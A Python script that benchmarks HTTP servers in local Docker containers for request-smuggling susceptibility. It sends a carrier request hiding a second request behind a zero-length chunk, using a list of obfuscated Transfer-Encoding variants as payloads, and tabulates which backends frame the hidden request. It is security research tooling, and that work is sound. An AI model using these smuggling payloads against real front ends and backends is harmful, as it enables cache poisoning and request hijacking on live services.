#!/usr/bin/env python3
# Phage: HTTP framing honor matrix runner.
# License: Apache-2.0 License

"""Measure which HTTP implementations honor which malformed Transfer-Encoding, so a
smuggling pair can be predicted instead of guessed.

A desync is a disagreement between two parsers, so the exploitable question is never
"is this proxy vulnerable" but "does the backend behind it draw the message boundary
somewhere else". This measures the second half.

Signal: the number of HTTP response status lines the server emits for ONE carrier
request whose body contains a second, complete request after a zero-length chunk.
Two responses means the server de-chunked, honored Transfer-Encoding, and framed the
smuggled bytes as a request of their own. That is language-agnostic, so no
per-backend logging is needed.

Every row is gated on a per-backend CONTROL: an explicitly pipelined pair that any
correct server must answer with two responses. If the control does not produce two,
the counter cannot reach two on that backend and every verdict from it is discarded
as UNTRUSTED rather than reported as safe. A negative from an instrument that has
not been shown to produce a positive is not evidence of absence.

Usage:
  python matrix/run_matrix.py                 # every backend
  python matrix/run_matrix.py --only Node,Go  # substring filter
  python matrix/run_matrix.py --json out.json --md MATRIX.md
"""

import argparse
import json
import socket
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from backends import BACKENDS  # noqa: E402

# The framing header blocks under test. Each entry is the raw header line(s) inserted
# after Content-Length, so a variant can express what a single value cannot: a duplicated
# Transfer-Encoding, an obs-fold continuation, a second conflicting coding. The first
# entry is well-formed and acts as the reference; a server honoring plain `chunked` is
# behaving correctly, and the obfuscated rows decide whether a lenient front end can be
# paired with it.
VARIANTS = [
    ("chunked", b"Transfer-Encoding: chunked"),
    ("chunked<TAB>", b"Transfer-Encoding: chunked\t"),
    ("chunked<SP>", b"Transfer-Encoding: chunked "),
    ("chunked<VT>", b"Transfer-Encoding: chunked\x0b"),
    ("CHUNKED", b"Transfer-Encoding: CHUNKED"),
    ("chunked;a=b", b"Transfer-Encoding: chunked;a=b"),
    ("chunked, identity", b"Transfer-Encoding: chunked, identity"),
    ("identity, chunked", b"Transfer-Encoding: identity, chunked"),
    ("dup TE", b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    ("TE obs-fold", b"Transfer-Encoding: chunked\r\n\tidentity"),
    ("xchunked", b"Transfer-Encoding: xchunked"),
]

SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
CONTAINER = "phage_matrix_target"


def _responses(data: bytes) -> int:
    """How many HTTP responses came back on the connection."""
    return data.count(b"HTTP/1.1 ") + data.count(b"HTTP/1.0 ")


def _send(port: int, payload: bytes, settle: float = 2.5):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
    except OSError as exc:
        return None, f"connect failed: {exc}"
    try:
        s.sendall(payload)
        s.settimeout(settle)
        out = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except OSError:
        pass
    finally:
        s.close()
    return out, None


def build(hdr: bytes) -> bytes:
    """One carrier request whose body hides a second request behind a zero-length chunk."""
    body = b"0\r\n\r\n" + SMUGGLED
    return (
        b"POST /carrier HTTP/1.1\r\nHost: lab\r\n"
        b"Content-Length: %d\r\n%s\r\n\r\n" % (len(body), hdr)
    ) + body


def probe(port: int, hdr: bytes):
    return _send(port, build(hdr))


def control(port: int):
    """Two explicitly pipelined requests. A correct server answers with two responses.
    This proves the counter can reach two on THIS backend before any verdict is trusted."""
    req = (
        b"GET /ctl1 HTTP/1.1\r\nHost: lab\r\n\r\n"
        b"GET /ctl2 HTTP/1.1\r\nHost: lab\r\n\r\n"
    )
    return _send(port, req)


def classify(resp: bytes) -> str:
    """SMUGGLE  the backend framed the hidden request as a second request
    reject    it refused the message outright
    CL-safe   it framed exactly one request, reading the body by Content-Length"""
    if not resp:
        return "no-response"
    n = _responses(resp)
    first = resp.split(b"\r\n", 1)[0]
    bad = b" 4" in first[:13] or b" 5" in first[:13]
    if n >= 2:
        return "SMUGGLE"
    if bad:
        code = (
            first.split(b" ")[1].decode(errors="replace")
            if len(first.split(b" ")) > 1
            else "?"
        )
        return f"reject {code}"
    return "CL-safe"


def docker(*args, **kw):
    return subprocess.run(["docker", *args], capture_output=True, text=True, **kw)


def start(spec) -> bool:
    docker("rm", "-f", CONTAINER)
    # host networking + an explicit loopback bind inside the app: these toy servers must
    # never be reachable off-box.
    r = docker(
        "run",
        "-d",
        "--name",
        CONTAINER,
        "--network",
        "host",
        spec["image"],
        "sh",
        "-c",
        spec["app"],
    )
    if r.returncode != 0:
        print(f"    docker run failed: {r.stderr.strip()[:200]}")
        return False
    for _ in range(int(spec.get("boot", 150))):
        try:
            socket.create_connection(("127.0.0.1", spec["port"]), timeout=1).close()
            time.sleep(1.0)  # let the server finish binding before the first probe
            return True
        except OSError:
            time.sleep(1.0)
    print("    timed out waiting for the port")
    return False


def run(spec) -> dict:
    row = {
        "name": spec["name"],
        "parser": spec["parser"],
        "results": {},
        "trusted": False,
    }
    print(f"  {spec['name']} ({spec['parser']})")
    if not start(spec):
        row["error"] = "failed to start"
        return row
    try:
        ctl, err = control(spec["port"])
        row["control_responses"] = _responses(ctl) if ctl else 0
        row["trusted"] = bool(ctl) and _responses(ctl) >= 2
        if not row["trusted"]:
            print(
                f"    CONTROL FAILED (responses={row['control_responses']}), verdicts untrusted"
            )
        for label, te in VARIANTS:
            resp, err = probe(spec["port"], te)
            verdict = classify(resp) if not err else f"error: {err}"
            row["results"][label] = verdict
            print(f"    {label:20} {verdict}")
    finally:
        docker("rm", "-f", CONTAINER)
    return row


def to_markdown(rows) -> str:
    heads = [v[0] for v in VARIANTS]
    out = [
        "# HTTP framing honor matrix",
        "",
        "Which backend honors which malformed `Transfer-Encoding`, measured by counting the",
        "HTTP responses each server emits for one carrier request that hides a second request",
        "behind a zero-length chunk. **SMUGGLE** means the server framed the hidden request as",
        "a request of its own, so any front end that forwards this value can be paired with it",
        "for a desync.",
        "",
        "Every row is gated on a pipelining control that must produce two responses; a row that",
        "fails it is reported UNTRUSTED, never as safe.",
        "",
        "**What UNTRUSTED means.** Counting responses can only detect a second framed request on",
        "a connection the server keeps open. A backend that closes after one response cannot",
        "produce two, so the counter is structurally unable to reach a positive there and every",
        "verdict from it is withheld rather than reported as safe. That is a limit of this",
        "instrument, not a clean bill of health. It is also worth noting that such a backend is a",
        "poor smuggling target for the same reason: no connection reuse means no pooled",
        "connection to poison. To classify one properly, read what the application framed instead",
        "of what the socket returned.",
        "",
        "Generated by `python matrix/run_matrix.py`.",
        "",
        "| backend | parser | " + " | ".join(f"`{h}`" for h in heads) + " |",
        "|---|---|" + "---|" * len(heads),
    ]
    for r in rows:
        if r.get("error"):
            out.append(
                f"| {r['name']} | {r['parser']} | "
                + " | ".join(["n/a"] * len(heads))
                + " |"
            )
            continue
        cells = [r["results"].get(h, "?") for h in heads]
        name = r["name"] if r.get("trusted") else f"{r['name']} (UNTRUSTED)"
        out.append(f"| {name} | `{r['parser']}` | " + " | ".join(cells) + " |")
    smug = sorted(
        {r["name"] for r in rows if "SMUGGLE" in r.get("results", {}).values()}
    )
    out += ["", f"Backends that honor at least one variant: {len(smug)}.", ""]
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="HTTP framing honor matrix")
    ap.add_argument("--only", help="comma-separated substrings of backend names")
    ap.add_argument("--json", default="matrix/results.json")
    ap.add_argument("--md", default="matrix/MATRIX.md")
    args = ap.parse_args()

    specs = BACKENDS
    if args.only:
        want = [s.strip().lower() for s in args.only.split(",")]
        specs = [s for s in specs if any(w in s["name"].lower() for w in want)]
    if not specs:
        print("no backends matched")
        return 1

    print(f"measuring {len(specs)} backend(s)")
    rows = [run(s) for s in specs]

    Path(args.json).parent.mkdir(parents=True, exist_ok=True)
    Path(args.json).write_text(json.dumps(rows, indent=2) + "\n")
    Path(args.md).write_text(to_markdown(rows))
    print(f"\nwrote {args.json} and {args.md}")
    untrusted = [r["name"] for r in rows if not r.get("trusted") and not r.get("error")]
    if untrusted:
        print(f"UNTRUSTED rows (control did not reach two): {', '.join(untrusted)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
